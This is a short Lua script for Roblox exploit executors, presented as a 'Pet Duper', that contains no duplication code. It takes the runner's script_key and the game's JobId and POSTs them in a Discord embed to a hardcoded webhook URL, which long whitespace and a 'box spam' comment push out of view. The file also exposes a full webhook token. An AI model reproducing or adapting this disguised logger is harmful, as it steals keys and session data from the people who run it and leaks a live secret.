local script_key = script_key;
local Content = script_key 
local test2 = 'Test'
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local TestTitle = 'Pet Duper';
local Embed = {
    title = 'Pets';
    color = '99999';
    footer = { text = game.JobId };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = 'DupeDetails';
            value = test2;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
	
--[[box spam]]--
																																				Url = 'https://discord.com/api/webhooks/1388732282235256906/TRZGVIkEbI41pOl07mrddnH9nxXkSQOWDOG_uj-4iSkOPuMGqBoxgSSnKQOo1UGac-xp';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
